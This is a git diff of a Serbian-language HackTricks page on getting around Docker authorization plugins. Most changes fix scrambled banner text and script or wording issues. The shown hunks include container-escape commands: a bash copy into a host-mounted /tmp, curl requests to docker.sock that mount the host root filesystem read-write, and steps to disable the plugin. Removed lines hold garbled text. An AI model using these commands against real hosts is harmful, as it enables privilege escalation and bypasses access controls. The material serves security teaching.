@@ -1,20 +1,16 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Support HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 {% endhint %}
 
 
@@ -26,15 +22,15 @@ Docker Auth dodaci su **spoljni** **dodaci** koje možete koristiti da **dozvoli
 
 **[Sledeće informacije su iz dokumentacije](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Kada se **HTTP** **zahtev** šalje Docker **demonu** putem CLI ili putem Engine API, **sistem autentifikacije** **prosledi** zahtev instaliranom **autentifikacionom** **dodatku**(cima). Zahtev sadrži korisnika (pozivaoca) i kontekst komande. **Dodatak** je odgovoran za odlučivanje da li da **dozvoli** ili **odbaci** zahtev.
+Kada se **HTTP** **zahtev** šalje Docker **demonu** putem CLI-a ili putem Engine API-ja, **sistem** **autentifikacije** **prosledi** zahtev instaliranom **autentifikacionom** **dodatku**(cima). Zahtev sadrži korisnika (pozivaoca) i kontekst komande. **Dodatak** je odgovoran za odlučivanje da li da **dozvoli** ili **odbaci** zahtev.
 
-Dijagrami sekvenci ispod prikazuju tok autorizacije dozvola i odbijanja:
+Sekvencijalni dijagrami u nastavku prikazuju tok autorizacije dozvola i odbijanja:
 
-![Tok autorizacije dozvola](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Tok autorizacije odbijanja](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Svaki zahtev poslat dodatku **uključuje autentifikovanog korisnika, HTTP zaglavlja i telo zahteva/odgovora**. Samo su **ime korisnika** i **metoda autentifikacije** korišćena prosleđena dodatku. Najvažnije, **nema** korisničkih **akreditiva** ili tokena koji se prosleđuju. Na kraju, **ne šalju se svi zahtevi/tela odgovora** autorizacionom dodatku. Samo ona tela zahteva/odgovora gde je `Content-Type` ili `text/*` ili `application/json` se šalju.
+Svaki zahtev poslat dodatku **uključuje autentifikovanog korisnika, HTTP zaglavlja i telo zahteva/odgovora**. Samo se **ime korisnika** i **metoda autentifikacije** koriste prosleđuju dodatku. Najvažnije, **nema** korisničkih **akreditiva** ili tokena koji se prosleđuju. Na kraju, **ne šalju se sva tela zahteva/odgovora** autorizacionom dodatku. Samo ona tela zahteva/odgovora gde je `Content-Type` ili `text/*` ili `application/json` se šalju.
 
 Za komande koje potencijalno mogu preuzeti HTTP vezu (`HTTP Upgrade`), kao što je `exec`, autorizacioni dodatak se poziva samo za inicijalne HTTP zahteve. Kada dodatak odobri komandu, autorizacija se ne primenjuje na ostatak toka. Konkretno, streaming podaci se ne prosleđuju autorizacionim dodacima. Za komande koje vraćaju delimične HTTP odgovore, kao što su `logs` i `events`, samo se HTTP zahtev šalje autorizacionim dodacima.
 
@@ -42,7 +38,7 @@ Tokom obrade zahteva/odgovora, neki tokovi autorizacije mogu zahtevati dodatne u
 
 ## Nekoliko dodataka
 
-Vi ste odgovorni za **registraciju** vašeg **dodatka** kao deo **pokretanja** Docker demona. Možete instalirati **više dodataka i povezati ih**. Ova veza može biti uređena. Svaki zahtev ka demonu prolazi redom kroz ovu vezu. Samo kada **svi dodaci odobre pristup** resursu, pristup se odobrava.
+Vi ste odgovorni za **registraciju** vašeg **dodatka** kao deo **pokretanja** Docker demona. Možete instalirati **više dodataka i povezati ih**. Ova veza može biti uređena. Svaki zahtev ka demonu prolazi redom kroz vezu. Samo kada **svi dodaci odobre pristup** resursu, pristup se odobrava.
 
 # Primeri dodataka
 
@@ -98,7 +94,7 @@ Sada, korisnik može da pobegne iz kontejnera koristeći neku od [**prethodno di
 
 ## Montiranje Writable Folder-a
 
-U ovom slučaju, sysadmin je **zabranio korisnicima da pokreću kontejnere sa `--privileged` flagom** ili daju bilo kakvu dodatnu sposobnost kontejneru, i dozvolio je samo montiranje `/tmp` foldera:
+U ovom slučaju, sysadmin je **zabranio korisnicima da pokreću kontejnere sa `--privileged` flag-om** ili daju bilo kakvu dodatnu sposobnost kontejneru, i dozvolio je samo montiranje `/tmp` folder-a:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -154,7 +150,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### Mounts in HostConfig
 
-Pratite iste instrukcije kao sa **Binds in root** izvršavajući ovaj **request** ka Docker API:
+Pratite iste upute kao sa **Binds in root** izvršavajući ovaj **request** na Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
@@ -171,12 +167,12 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-**`HostConfig`** је кључ који обично садржи **занимљиве** **права** за бекство из контејнера. Међутим, као што смо раније расправљали, приметите како коришћење Binds ван њега такође функционише и може вам омогућити да заобиђете ограничења.
+**`HostConfig`** je ključ koji obično sadrži **zanimljive** **privilegije** za izlazak iz kontejnera. Međutim, kao što smo prethodno razgovarali, obratite pažnju na to kako korišćenje Binds van njega takođe funkcioniše i može vam omogućiti da zaobiđete ograničenja.
 {% endhint %}
 
-## Онемогућавање Плугинa
+## Onemogućavanje Plugina
 
-Ако је **систем администратор** **заборавио** да **забрани** могућност **онемогућавања** **плугинa**, можете искористити ово да га потпуно онемогућите!
+Ako je **sistem administrator** **zaboravio** da **zabraniti** mogućnost **onemogućavanja** **plugina**, možete iskoristiti ovo da ga potpuno onemogućite!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -194,26 +190,17 @@ Zapamtite da **ponovo omogućite dodatak nakon eskalacije**, ili **ponovno pokre
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## References
-{% hnt stye="acceas" %}
-AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>Podržite HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
